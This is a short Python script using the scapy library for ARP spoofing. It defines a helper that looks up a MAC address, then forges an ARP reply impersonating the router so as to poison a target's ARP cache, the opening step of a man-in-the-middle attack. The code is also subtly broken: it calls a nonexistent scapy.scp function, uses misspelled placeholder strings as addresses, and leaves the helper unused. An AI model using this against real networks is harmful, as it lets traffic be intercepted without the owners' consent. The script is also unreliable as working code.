import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answer_list = scapy.scp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answer_list[0][1].hwsrc


packet=scapy.ARP(op=2,pdst="target_ip",hwdst="taget_mac",psrc="routr ip")
scapy.send(packet)
#the above is arp response
#this is just creating a packert to update ARP valus in the tarrget


